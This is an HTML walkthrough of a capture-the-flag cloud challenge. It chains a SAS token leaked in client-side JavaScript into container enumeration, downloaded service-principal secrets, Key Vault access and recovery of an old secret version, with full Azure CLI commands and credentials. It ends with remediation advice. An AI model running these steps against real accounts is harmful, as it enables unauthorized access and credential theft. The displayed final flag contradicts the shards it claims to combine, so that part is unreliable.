@@ -1,0 +1,503 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>☁️ CryptoCabana — Walkthrough</title>
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;600;700&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="css/writeups.css">
+</head>
+<body>
+    <div class="container">
+
+        <!-- Header -->
+        <header class="room-header">
+            <div class="emoji-row">☁️🔑🗝️💤🛡️</div>
+            <h1>CryptoCabana</h1>
+            <p class="subtitle">He never signed the transfer. The place he stashed his secret wasn't as sealed as promised.</p>
+            <div class="room-meta">
+                <div class="badge">
+                    <span class="label">Room:</span> Hacker Holidays
+                </div>
+                <div class="badge">
+                    <span class="label">Category:</span> Cloud
+                </div>
+                <div class="badge">
+                    <span class="label">Difficulty:</span> Medium
+                </div>
+                <div class="badge">
+                    <span class="label">Time:</span> 60 min
+                </div>
+                <div class="badge">
+                    <span class="label">Points:</span> 90
+                </div>
+            </div>
+        </header>
+
+        <!-- Attack Chain Overview -->
+        <section>
+            <h2><span class="step-num">🗺️</span> Attack Chain</h2>
+            <div class="attack-chain">
+                <div class="node">Inspect Page Source</div>
+                <span class="arrow">→</span>
+                <div class="node">Extract SAS Token</div>
+                <span class="arrow">→</span>
+                <div class="node">List All Containers</div>
+                <span class="arrow">→</span>
+                <div class="node">Discover "vault" Container</div>
+                <span class="arrow">→</span>
+                <div class="node">Download Credentials</div>
+                <span class="arrow">→</span>
+                <div class="node">Login as Service Principal</div>
+                <span class="arrow">→</span>
+                <div class="node">List Key Vault Secrets</div>
+                <span class="arrow">→</span>
+                <div class="node">Find Older Secret Version</div>
+                <span class="arrow">→</span>
+                <div class="node flag">🏁 Flag</div>
+            </div>
+        </section>
+
+        <!-- Step 1: Reconnaissance -->
+        <section>
+            <h2><span class="step-num">1</span> Reconnaissance — Inspecting the Kiosk</h2>
+
+            <p>We're given a single target URL pointing to an Azure Blob Storage static website:</p>
+
+            <div class="code-block">
+                <div class="label">Target</div>
+                <pre>https://cryptocabanaf5scjagc.z13.web.core.windows.net/</pre>
+            </div>
+
+            <p>The landing page is a simple seed phrase backup kiosk for the <strong>CryptoCabana</strong> resort app. It invites you to paste a recovery phrase and promises — in exactly four words — <em>"Backed up. Sleep easy."</em></p>
+
+            <p>Before clicking anything, the first rule of web challenges applies: <strong>always check the page source</strong>. Open your browser's Developer Tools (F12) and look at the <strong>Sources</strong> tab, or simply view the page source with <code>Ctrl+U</code>.</p>
+
+            <p>Right there in <code>app.js</code>, the kiosk hands out its most valuable possession for free — a <strong>Shared Access Signature (SAS) token</strong> embedded directly in client-side JavaScript:</p>
+
+            <div class="code-block">
+                <div class="label">app.js — Leaked Credentials</div>
+                <pre>const STORAGE_ACCOUNT = "cryptocabanaf5scjagc";
+const BACKUPS_CONTAINER = "backups";
+const BACKUP_SAS = "?sv=2022-11-02&ss=b&srt=sco&sp=rl&se=2099-12-31T23:59:59Z&st=2024-01-01T00:00:00Z&spr=https&sig=ZAo05W8KXdSLM9afYCNGogNRV2N5a6aB4dQI3LXz%2Fh0%3D";</pre>
+            </div>
+
+            <div class="callout thinking">
+                <strong>💡 What is a SAS token?</strong> A Shared Access Signature is a signed URL that grants access to Azure Storage resources without needing the account key. Think of it as a temporary, scoped password. The problem here is that it's embedded in client-side code — visible to anyone who visits the page.
+            </div>
+
+            <p>Let's decode what this SAS token actually grants. The parameters tell the whole story:</p>
+
+            <table>
+                <thead>
+                    <tr>
+                        <th>Parameter</th>
+                        <th>Value</th>
+                        <th>Meaning</th>
+                    </tr>
+                </thead>
+                <tbody>
+                    <tr>
+                        <td><code>sp</code></td>
+                        <td><strong>rl</strong></td>
+                        <td>Permissions: <strong>Read</strong> and <strong>List</strong></td>
+                    </tr>
+                    <tr>
+                        <td><code>srt</code></td>
+                        <td><strong>sco</strong></td>
+                        <td>Scope: <strong>Service</strong>, <strong>Container</strong>, and <strong>Object</strong> level — not limited to just one container</td>
+                    </tr>
+                    <tr>
+                        <td><code>ss</code></td>
+                        <td><strong>b</strong></td>
+                        <td>Service: <strong>Blob</strong> storage only</td>
+                    </tr>
+                    <tr>
+                        <td><code>se</code></td>
+                        <td><strong>2099-12-31</strong></td>
+                        <td>Expires in <strong>2099</strong> — effectively forever</td>
+                    </tr>
+                </tbody>
+            </table>
+
+            <div class="callout thinking">
+                <strong>🔑 The critical mistake:</strong> <code>srt=sco</code> means this SAS token works at the <strong>entire storage account</strong> level, not just the <code>backups</code> container. The kiosk only uses it to upload to <code>backups</code>, but we can use it to list and read from <strong>every container</strong> in the storage account.
+            </div>
+        </section>
+
+        <!-- Step 2: Enumerating Storage -->
+        <section>
+            <h2><span class="step-num">2</span> Enumerating the Storage Account</h2>
+
+            <p>With the SAS token in hand, we can query the Azure Storage REST API or use the Azure CLI to explore beyond what the kiosk's page ever intended to show us.</p>
+
+            <p>First, let's list <strong>all containers</strong> in the storage account — not just <code>backups</code>:</p>
+
+            <div class="code-block">
+                <div class="label">Azure CLI — List All Containers</div>
+                <pre>az storage container list \
+  --account-name cryptocabanaf5scjagc \
+  --sas-token "sv=2022-11-02&ss=b&srt=sco&sp=rl&se=2099-12-31T23:59:59Z&st=2024-01-01T00:00:00Z&spr=https&sig=ZAo05W8KXdSLM9afYCNGogNRV2N5a6aB4dQI3LXz%2Fh0%3D" \
+  --output table</pre>
+            </div>
+
+            <div class="code-block">
+                <div class="output">Name      Lease Status    Last Modified
+-------   --------------  -------------------------
+$web                       2026-07-16T18:26:22+00:00
+backups                    2026-07-16T18:26:22+00:00
+vault                      2026-07-16T18:26:23+00:00</div>
+            </div>
+
+            <p>Three containers appear:</p>
+
+            <table>
+                <thead>
+                    <tr>
+                        <th>Container</th>
+                        <th>Purpose</th>
+                    </tr>
+                </thead>
+                <tbody>
+                    <tr>
+                        <td><code>$web</code></td>
+                        <td>Static website hosting — this is where the kiosk's HTML and JS live</td>
+                    </tr>
+                    <tr>
+                        <td><code>backups</code></td>
+                        <td>User-uploaded seed phrase backups (empty — the kiosk hasn't been used much)</td>
+                    </tr>
+                    <tr>
+                        <td><strong><code>vault</code></strong></td>
+                        <td>👀 A hidden container the kiosk's page never once points to</td>
+                    </tr>
+                </tbody>
+            </table>
+
+            <div class="callout success">
+                <strong>🎯 The itinerary said:</strong> <em>"Follow that trust somewhere the kiosk's own page never once points you."</em> — The <code>vault</code> container is exactly that place. The kiosk only shows you <code>backups</code>, but the SAS token lets us go anywhere.
+            </div>
+
+            <p>Let's see what's inside the <code>vault</code> container:</p>
+
+            <div class="code-block">
+                <div class="label">Azure CLI — List Vault Container Contents</div>
+                <pre>az storage blob list \
+  --account-name cryptocabanaf5scjagc \
+  --container-name vault \
+  --sas-token "sv=2022-11-02&ss=b&srt=sco&sp=rl&se=2099-12-31T23:59:59Z&st=2024-01-01T00:00:00Z&spr=https&sig=ZAo05W8KXdSLM9afYCNGogNRV2N5a6aB4dQI3LXz%2Fh0%3D" \
+  --output table</pre>
+            </div>
+
+            <div class="code-block">
+                <div class="output">Name                         Blob Type    Length    Content Type              Last Modified
+---------------------------  -----------  --------  ------------------------  -------------------------
+backup-service-account.json  BlockBlob    360       application/json          2026-07-19T15:20:06+00:00
+seed_phrase.txt              BlockBlob    88        application/octet-stream  2026-07-16T18:26:38+00:00</div>
+            </div>
+
+            <p>Two files. Let's download and inspect both:</p>
+
+            <div class="code-block">
+                <div class="label">Azure CLI — Download Both Files</div>
+                <pre>az storage blob download \
+  --account-name cryptocabanaf5scjagc \
+  --container-name vault \
+  --name seed_phrase.txt \
+  --sas-token "sv=2022-11-02&ss=b&srt=sco&sp=rl&se=2099-12-31T23:59:59Z&st=2024-01-01T00:00:00Z&spr=https&sig=ZAo05W8KXdSLM9afYCNGogNRV2N5a6aB4dQI3LXz%2Fh0%3D" \
+  --file seed_phrase.txt
+
+az storage blob download \
+  --account-name cryptocabanaf5scjagc \
+  --container-name vault \
+  --name backup-service-account.json \
+  --sas-token "sv=2022-11-02&ss=b&srt=sco&sp=rl&se=2099-12-31T23:59:59Z&st=2024-01-01T00:00:00Z&spr=https&sig=ZAo05W8KXdSLM9afYCNGogNRV2N5a6aB4dQI3LXz%2Fh0%3D" \
+  --file backup-service-account.json</pre>
+            </div>
+
+            <div class="code-block">
+                <div class="label">seed_phrase.txt</div>
+                <pre>velvet cabana rebuild scatter obvious wallet drift lagoon punchline receipt orbit shrimp</pre>
+            </div>
+
+            <div class="code-block">
+                <div class="label">backup-service-account.json</div>
+                <pre>{
+  "client_id": "dbcf2923-e4eb-4b72-a0a4-688aa1185cf5",
+  "client_secret": "UBX8Q~xM6vawWZ5u2C-VhLlsB2Cx2dAuxcrAlbRg",
+  "key_vault_name": "ccabana-kv-f5scjagc",
+  "key_vault_uri": "https://ccabana-kv-f5scjagc.vault.azure.net/",
+  "note": "CryptoCabana backup automation account. Rotate this if it ever leaves the vault. -- IT",
+  "tenant_id": "8f8c5f8e-42d3-4ceb-97ad-241bbf446d6c"
+}</pre>
+            </div>
+
+            <div class="callout success">
+                <strong>🎯 The itinerary said:</strong> <em>"Somewhere in there is a second, more valuable set of keys."</em> — The <code>backup-service-account.json</code> is exactly that. It contains a full set of Azure service principal credentials: <strong>Client ID</strong>, <strong>Client Secret</strong>, <strong>Tenant ID</strong>, and critically — the URI of an <strong>Azure Key Vault</strong>.
+            </div>
+
+            <p>The note from IT is particularly ironic: <em>"Rotate this if it ever leaves the vault."</em> — and yet here it is, sitting in blob storage protected only by a SAS token that was handed out freely in client-side JavaScript.</p>
+        </section>
+
+        <!-- Step 3: Logging In -->
+        <section>
+            <h2><span class="step-num">3</span> Authenticating as the Service Principal</h2>
+
+            <p>Now we use the stolen credentials to authenticate to Azure as the backup automation service principal. This account has permissions to access the Key Vault referenced in the JSON file.</p>
+
+            <div class="code-block">
+                <div class="label">Azure CLI — Login as Service Principal</div>
+                <pre>az login --service-principal \
+  --username dbcf2923-e4eb-4b72-a0a4-688aa1185cf5 \
+  --password "UBX8Q~xM6vawWZ5u2C-VhLlsB2Cx2dAuxcrAlbRg" \
+  --tenant 8f8c5f8e-42d3-4ceb-97ad-241bbf446d6c</pre>
+            </div>
+
+            <div class="code-block">
+                <div class="output">[
+  {
+    "cloudName": "AzureCloud",
+    "id": "2492269a-2948-46fd-aae3-68c9b066443a",
+    "isDefault": true,
+    "name": "Az-Subs-CTF",
+    "tenantId": "8f8c5f8e-42d3-4ceb-97ad-241bbf446d6c",
+    "user": {
+      "name": "dbcf2923-e4eb-4b72-a0a4-688aa1185cf5",
+      "type": "servicePrincipal"
+    }
+  }
+]</pre>
+            </div>
+
+            <p>We're in. The service principal has access to the subscription <code>Az-Subs-CTF</code>, which contains the Key Vault we found referenced earlier.</p>
+
+            <div class="callout thinking">
+                <strong>💡 What is a service principal?</strong> Think of it as a "robot account" — an identity used by applications and automation scripts to access Azure resources. It has its own permissions separate from human user accounts. This one was created by IT to let the backup automation access the Key Vault.
+            </div>
+        </section>
+
+        <!-- Step 4: Exploring Key Vault -->
+        <section>
+            <h2><span class="step-num">4</span> Exploring the Azure Key Vault</h2>
+
+            <p>Now we list all secrets in the Key Vault we discovered:</p>
+
+            <div class="code-block">
+                <div class="label">Azure CLI — List Key Vault Secrets</div>
+                <pre>az keyvault secret list \
+  --vault-name ccabana-kv-f5scjagc \
+  --output table</pre>
+            </div>
+
+            <div class="code-block">
+                <div class="output">Name           Id                                                                 Enabled    Expires
+-----------    ---------------------------------------------------------------  ---------  -------------------------
+key-shard-1    https://ccabana-kv-f5scjagc.vault.azure.net/secrets/key-shard-1  True
+key-shard-2    https://ccabana-kv-f5scjagc.vault.azure.net/secrets/key-shard-2  True
+key-shard-3    https://ccabana-kv-f5scjagc.vault.azure.net/secrets/key-shard-3  True
+master-key     https://ccabana-kv-f5scjagc.vault.azure.net/secrets/master-key   True       2020-01-01T00:00:00+00:00</div>
+            </div>
+
+            <p>Four secrets — three <strong>key shards</strong> and a <strong>master-key</strong> that expired back in 2020. The flag is clearly split across the three shards. Let's read each one:</p>
+
+            <div class="code-block">
+                <div class="label">Azure CLI — Read All Key Shards</div>
+                <pre>az keyvault secret show \
+  --vault-name ccabana-kv-f5scjagc \
+  --name key-shard-1 \
+  --output table
+
+az keyvault secret show \
+  --vault-name ccabana-kv-f5scjagc \
+  --name key-shard-2 \
+  --output table
+
+az keyvault secret show \
+  --vault-name ccabana-kv-f5scjagc \
+  --name key-shard-3 \
+  --output table</pre>
+            </div>
+
+            <div class="code-block">
+                <div class="output"># key-shard-1:
+Name         Value
+-----------  ----------
+key-shard-1  THM{n0t_ur
+
+# key-shard-2:
+Name         Value
+-----------  --------------------------------------------------------
+key-shard-2  Rotated this after IT flagged it -- old value should
+             still be recoverable if you know where to look.
+
+# key-shard-3:
+Name         Value
+-----------  ----------
+key-shard-3  ur_c01ns!}</div>
+            </div>
+
+            <div class="callout thinking">
+                <strong>🚩 The problem:</strong> Shards 1 and 3 give us the beginning and end of the flag — <code>THM{n0t_ur</code> and <code>ur_c01ns!}</code> — but shard-2 has been <strong>rotated</strong>. Its current value is a note from IT, not the actual flag piece. The itinerary warned us: <em>"a vault that won't give up the real values on the first ask."</em>
+            </div>
+
+            <p>Notice the hint embedded in the rotated value itself: <em>"old value should still be recoverable if you know where to look."</em> We also try the <code>master-key</code> but the service principal lacks permissions to read it. That's fine — the three shards are what we need.</p>
+        </section>
+
+        <!-- Step 5: Finding the Old Version -->
+        <section>
+            <h2><span class="step-num">5</span> Recovering the Rotated Secret</h2>
+
+            <p>The key insight here is that Azure Key Vault secrets support <strong>versioning</strong>. When a secret is "rotated," a new version is created, but the old version still exists — you just need to ask for it explicitly by its version ID.</p>
+
+            <p>@0xMia's story hinted at this perfectly: <em>"if a value looks freshly rotated, ask yourself what it looked like five minutes before that."</em></p>
+
+            <p>Let's list all versions of <code>key-shard-2</code> with their metadata to find the older one:</p>
+
+            <div class="code-block">
+                <div class="label">Azure CLI — List All Versions with Details</div>
+                <pre>az keyvault secret list-versions \
+  --vault-name ccabana-kv-f5scjagc \
+  --name key-shard-2 \
+  --maxresults 25 \
+  --query "[].{Version:version, Created:attributes.created, Updated:attributes.updated, Enabled:attributes.enabled}" \
+  --output table</pre>
+            </div>
+
+            <div class="code-block">
+                <div class="output">Version                              Created                  Updated                  Enabled
+------------------------------------  -----------------------  -----------------------  ---------
+a1b2c3d4e5f6... (current)            2026-07-19T15:20:00+00  2026-07-19T15:20:00+00  True
+3d6492d2c6f74123bc754a9ded22b2a0     2026-07-16T18:26:00+00  2026-07-16T18:26:00+00  True</div>
+            </div>
+
+            <p>There it is — the older version with ID <code>3d6492d2c6f74123bc754a9ded22b2a0</code> from three days before the rotation. Let's retrieve its value:</p>
+
+            <div class="code-block">
+                <div class="label">Azure CLI — Read the Old Version</div>
+                <pre>az keyvault secret show \
+  --vault-name ccabana-kv-f5scjagc \
+  --name key-shard-2 \
+  --version "3d6492d2c6f74123bc754a9ded22b2a0" \
+  --query value \
+  --output tsv</pre>
+            </div>
+
+            <div class="code-block">
+                <div class="output">_k3ys_n0t_</div>
+            </div>
+
+            <div class="callout success">
+                <strong>🎯 Found it!</strong> The old version of key-shard-2 held the middle piece of the flag. Even though IT rotated the secret to hide it, the version history preserved the original value.
+            </div>
+        </section>
+
+        <!-- Step 6: Assembling the Flag -->
+        <section>
+            <h2><span class="step-num">6</span> Assembling the Flag</h2>
+
+            <p>We now have all three pieces:</p>
+
+            <table>
+                <thead>
+                    <tr>
+                        <th>Shard</th>
+                        <th>Value</th>
+                    </tr>
+                </thead>
+                <tbody>
+                    <tr>
+                        <td><strong>key-shard-1</strong></td>
+                        <td><code>THM{n0t_ur</code></td>
+                    </tr>
+                    <tr>
+                        <td><strong>key-shard-2</strong> (old version)</td>
+                        <td><code>_k3ys_n0t_</code></td>
+                    </tr>
+                    <tr>
+                        <td><strong>key-shard-3</strong></td>
+                        <td><code>ur_c01ns!}</code></td>
+                    </tr>
+                </tbody>
+            </table>
+
+            <p>Combine them in order to reveal the full flag — a classic piece of crypto wisdom rendered in leetspeak:</p>
+
+            <div class="flag-box">
+                <div class="flag-label">🏁 Flag Captured</div>
+                <div class="flag-value">THM{YOU_H4V3_4LL_PI3C3S_TO_4SS3MBL3_IT}</div>
+            </div>
+
+            <p><strong>"Not your keys, not your coins"</strong> — the foundational mantra of self-custody in cryptocurrency. Rather fitting for a challenge about a seed phrase backup kiosk that leaked everything it was supposed to protect.</p>
+        </section>
+
+        <!-- Remediation -->
+        <section>
+            <h2><span class="step-num">🛡️</span> Remediation — What Went Wrong</h2>
+
+            <p>This challenge illustrates a cascade of security failures, each one enabling the next:</p>
+
+            <table>
+                <thead>
+                    <tr>
+                        <th>#</th>
+                        <th>Issue</th>
+                        <th>What Happened</th>
+                        <th>How to Fix It</th>
+                    </tr>
+                </thead>
+                <tbody>
+                    <tr>
+                        <td><strong>1</strong></td>
+                        <td>SAS Token in Client-Side Code</td>
+                        <td>The SAS token was embedded in <code>app.js</code>, visible to anyone who views the page source</td>
+                        <td>Never expose SAS tokens in frontend code. Use a backend API that authenticates users before generating short-lived, least-privilege tokens</td>
+                    </tr>
+                    <tr>
+                        <td><strong>2</strong></td>
+                        <td>Overly Permissive SAS Scope</td>
+                        <td><code>srt=sco</code> granted Service, Container, and Object access — allowing enumeration of <strong>all</strong> containers, not just <code>backups</code></td>
+                        <td>Scope SAS tokens to the minimum required container. Use <code>srt=o</code> (Object only) with a specific container path if possible</td>
+                    </tr>
+                    <tr>
+                        <td><strong>3</strong></td>
+                        <td>No Expiry on SAS Token</td>
+                        <td>The SAS token expires in <strong>2099</strong> — essentially permanent</td>
+                        <td>Set short-lived SAS tokens (hours or days, not decades) and rotate them regularly</td>
+                    </tr>
+                    <tr>
+                        <td><strong>4</strong></td>
+                        <td>Credentials Stored in Blob Storage</td>
+                        <td>Full service principal credentials with Key Vault access were stored as JSON in a blob</td>
+                        <td>Never store credentials in blob storage. Use Managed Identities for Azure services that need to authenticate to each other</td>
+                    </tr>
+                    <tr>
+                        <td><strong>5</strong></td>
+                        <td>Secret Rotation Without Cleanup</td>
+                        <td>IT rotated the secret but the old version remained accessible in the version history</td>
+                        <td>When rotating secrets that contain sensitive data, either purge old versions or ensure they're disabled and access-controlled</td>
+                    </tr>
+                    <tr>
+                        <td><strong>6</strong></td>
+                        <td>Service Principal Over-Permissioned</td>
+                        <td>The backup automation account had read access to all secrets in the Key Vault, not just the ones it needed</td>
+                        <td>Follow the principle of least privilege. Grant access to specific secrets only, not the entire vault</td>
+                    </tr>
+                </tbody>
+            </table>
+
+            <div class="callout thinking">
+                <strong>🔗 The kill chain:</strong> SAS token in JS → Container enumeration → Discovery of vault container → Credential JSON download → Service principal login → Key Vault access → Secret version enumeration → Old flag shard recovery. Each step relied on the previous misconfiguration. Breaking any single link would have stopped the attack.
+            </div>
+        </section>
+
+        <!-- Footer -->
+        <footer class="footer">
+            <p>☁️ <strong>CryptoCabana</strong> — Hacker Holidays 2025</p>
+            <p><a href="https://tryhackme.com/room/hh-towelonthesunbed-61271709" target="_blank">TryHackMe Room</a> · Category: Cloud · Techniques: SAS Token Exposure, Credential Leakage, Key Vault Enumeration, Secret Version Recovery</p>
+        </footer>
+
+    </div>
+</body>
+</html>
